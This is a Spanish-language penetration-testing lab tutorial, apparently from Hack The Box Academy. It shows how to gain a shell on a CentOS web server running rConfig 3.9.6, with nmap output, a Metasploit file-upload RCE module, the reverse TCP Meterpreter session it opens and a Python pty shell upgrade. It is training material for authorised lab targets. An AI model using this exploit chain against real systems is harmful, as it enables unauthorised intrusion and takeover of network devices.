# Infiltrando Unix/Linux

W3Techs mantiene una estadística de uso del sistema operativo en curso[estudiar](https://w3techs.com/technologies/overview/operating_system). Este estudio informa que sobre`70%`de los sitios web (servidores web) se ejecutan en un sistema basado en UNIX. Para nosotros, esto significa que podemos beneficiarnos significativamente de continuar aumentando nuestro conocimiento de Unix/Linux y cómo podemos obtener sesiones de conchas en estos entornos para potencialmente girar más dentro de un entorno. Si bien es común que las organizaciones usen terceros y proveedores de la nube para alojar sus sitios web y aplicaciones web, muchas organizaciones aún alojan sus sitios web y aplicaciones web en servidores en sus entornos de red (On-Prem). En estos casos, queremos establecer una sesión de shell con el sistema subyacente para intentar pivotar a otros sistemas en la red interna.

---

# **Consideraciones comunes**

Como es muy posible que ya haya notado, obtener una sesión de shell con un sistema se puede hacer de varias maneras, una forma común es a través de una vulnerabilidad en una aplicación. Identificaremos una vulnerabilidad y descubriremos una exploit que podemos usar para obtener un shell entregando una carga útil. Al considerar cómo estableceremos una sesión de shell en un sistema UNIX/Linux, nos beneficiaremos de considerar lo siguiente:

- ¿Qué distribución de Linux se ejecuta el sistema?
- ¿Qué lenguajes de shell y programación existen en el sistema?
- ¿En qué función está sirviendo el sistema para el entorno de red en el que se encuentra?
- ¿Qué aplicación es el alojamiento del sistema?
- ¿Hay alguna vulnerabilidad conocida?

Vamos a profundizar en este concepto atacando una aplicación vulnerable alojada en un sistema Linux. Tenga en cuenta las preguntas y tome notas mientras pasamos por esto. ¿Puedes responderles?

---

# **Ganar un caparazón al atacar una aplicación vulnerable**

Como en la mayoría de los compromisos, comenzaremos con una enumeración inicial del sistema utilizando`Nmap`.

### **Enumerar al anfitrión**

Infiltrando Unix/Linux

```
xnoxos@htb[/htb]$ nmap -sC -sV 10.129.201.101Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC#100000)| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)

```

Manteniendo nuestro objetivo de`gaining a shell session`En mente, debemos establecer algunos próximos pasos después de examinar nuestra salida de escaneo.

`What information could we gather from the output?`

Teniendo en cuenta que podemos ver que el sistema está escuchando en los puertos 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), y 21 (`FTP`), puede ser seguro suponer que este es un servidor web que aloja una aplicación web. También podemos ver algunos números de versión revelados asociados con la pila web (`Apache 2.4.6`y`PHP 7.2.34`) y la distribución de Linux ejecutándose en el sistema (`CentOS`). Antes de decidir sobre una dirección para investigar más (sumergirse por una madriguera de conejo), también debemos intentar navegar a la dirección IP a través de un navegador web para descubrir la aplicación alojada si es posible.

### **Herramienta de gestión de RConfig**

![](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

Here we discover a network configuration management tool called [rConfig](https://www.rconfig.com/). This application is used by network & system administrators to automate the process of configuring network appliances. One practical use case would be to use rConfig to remotely configure network interfaces with IP addressing information on multiple routers simultaneously. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.

---

# **Descubrir una vulnerabilidad en RConfig**

Eche un vistazo a la parte inferior de la página de inicio de sesión web, y podemos ver el número de versión RCONFIG (`3.9.6`). Deberíamos usar esta información para comenzar a buscar cualquier`CVEs`, `publicly available exploits`, y`proof of concepts` (`PoCs`). Mientras investigamos, asegúrese de mirar de cerca lo que encontramos y entendemos lo que está haciendo. Nosotros, por supuesto, queremos que nos guíe a una sesión de shell con el objetivo.

El uso de su motor de búsqueda de elección aumentará algunos resultados prometedores. Podemos usar las palabras clave:`rConfig 3.9.6 vulnerability.`

![](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

Podemos ver que puede valer la pena elegir esto como el foco principal de nuestra investigación. El mismo pensamiento podría aplicarse a las versiones de Apache y PHP, pero dado que la aplicación se está ejecutando en la pila web, veamos si podemos obtener un caparazón a través de una exploit escrita para las vulnerabilidades encontradas en RConfig.

También podemos usar la funcionalidad de búsqueda de Metasploit para ver si algún módulo de exploit puede obtener una sesión de shell en el objetivo.

### **Buscar un módulo de exploit**

Infiltrando Unix/Linux

```
msf6 > search rconfig

Matching Modules
================

#  Name                                             Disclosure Date  Rank       Check  Description   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution

```

Un detalle que se puede pasar por alto al confiar en MSF para encontrar un módulo de exploit para una aplicación específica es la versión de MSF. Puede haber módulos de exploit útiles que no están instalados en nuestro sistema o simplemente no se muestran a través de la búsqueda. En estos casos, es bueno saber que Rapid 7 mantiene el código para los módulos de explotación en sus[Repos en Github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). Podríamos hacer una búsqueda aún más específica usando un motor de búsqueda:`rConfig 3.9.6 exploit metasploit github`

Esta búsqueda puede señalarnos el código fuente para un módulo de exploit llamado`rconfig_vendors_auth_file_upload_rce.rb`. Este exploit puede obtener una sesión de shell en una caja de destino Linux con RCONFIG 3.9.6. Si este exploit no apareció en la búsqueda de MSF, podemos copiar el código de este repositorio en nuestro cuadro de ataque local y guardarlo en el directorio que nuestra instalación local de MSF está haciendo referencia. Para hacer esto, podemos emitir este comando en nuestro cuadro de ataque:

### **Localizar**

Infiltrando Unix/Linux

```
xnoxos@htb[/htb]$ locate exploits
```

Queremos buscar los directorios en la salida asociada con el marco de MetaSploit. En Pwnbox, los módulos de explotación de metasploit se mantienen en:

`/usr/share/metasploit-framework/modules/exploits`

Podemos copiar el código en un archivo y guardarlo en`/usr/share/metasploit-framework/modules/exploits/linux/http`Similar a donde almacenan el código en el repositorio de GitHub. También debemos mantener a MSF actualizado usando los comandos`apt update; apt install metasploit-framework`o su administrador de paquetes local. Una vez que encontramos el módulo de Exploit y descargarlo (podemos usar WGet) o copiarlo en el directorio adecuado de GitHub, podemos usarlo para obtener una sesión de shell en el objetivo. Si lo copiamos en un archivo en nuestro sistema local, asegúrese de que el archivo tenga`.rb`como la extensión. Todos los módulos en MSF están escritos en Ruby.

---

# **Usando el exploit rconfig y ganando un caparazón**

En MSFConsole, podemos cargar manualmente el exploit usando el comando:

### **Seleccione un exploit**

Infiltrando Unix/Linux

```
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

```

Con este exploit seleccionado, podemos enumerar las opciones, ingresar la configuración adecuada específica para nuestro entorno de red y iniciar el exploit.

Use lo que ha aprendido en el módulo hasta ahora para completar las opciones asociadas con el exploit.

### **Ejecutar el exploit**

Infiltrando Unix/Linux

```
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg

```

Podemos ver en los pasos descritos en el proceso de explotación que esta exploit:

- Comprueba la versión vulnerable de rconfig
- Se autentica con el inicio de sesión web RCONFIG
- Sube una carga útil basada en PHP para una conexión de shell inversa
- Elimina la carga útil
- Nos deja con una sesión de shell de meterpreter

### **Interactuar con el caparazón**

Infiltrando Unix/Linux

```
meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg

```

Podemos caer en un shell de sistema (`shell`) para obtener acceso al sistema de destino como si hubiéramos sesión y abramos un terminal.

---

# **Desovando un caparazón con pitón**

Cuando caemos en el shell del sistema, notamos que no hay un aviso presente, pero aún podemos emitir algunos comandos del sistema. Esta es una carcasa típicamente conocida como un`non-tty shell`. Estos conchas tienen una funcionalidad limitada y a menudo pueden evitar nuestro uso de comandos esenciales como`su` (`switch user`) y`sudo` (`super user do`), que probablemente necesitaremos si buscamos aumentar los privilegios. Esto sucedió porque la carga útil fue ejecutada en el objetivo por el usuario de Apache. Nuestra sesión se establece como el usuario de Apache. Normalmente, los administradores no están accediendo al sistema como el usuario de Apache, por lo que no es necesario que se define un idioma de intérprete de shell en las variables de entorno asociadas con Apache.

Podemos generar manualmente una carcasa TTY usando Python si está presente en el sistema. Siempre podemos verificar la presencia de Python en los sistemas Linux escribiendo el comando:`which python`. Para generar la sesión de shell Tty con Python, escribimos el siguiente comando:

### **Pitón interactivo**

Infiltrando Unix/Linux

```
python -c 'import pty; pty.spawn("/bin/sh")'

sh-4.2$         sh-4.2$ whoamiwhoami
apache

```

Este comando usa Python para importar el[módulo Pty](https://docs.python.org/3/library/pty.html), luego usa el`pty.spawn`función para ejecutar el`bourne shell binary` (`/bin/sh`). Ahora tenemos un aviso (`sh-4.2$`) y el acceso a más comandos del sistema para moverse sobre el sistema como lo deseamos.

`Now, let's test our knowledge with some challenge questions.`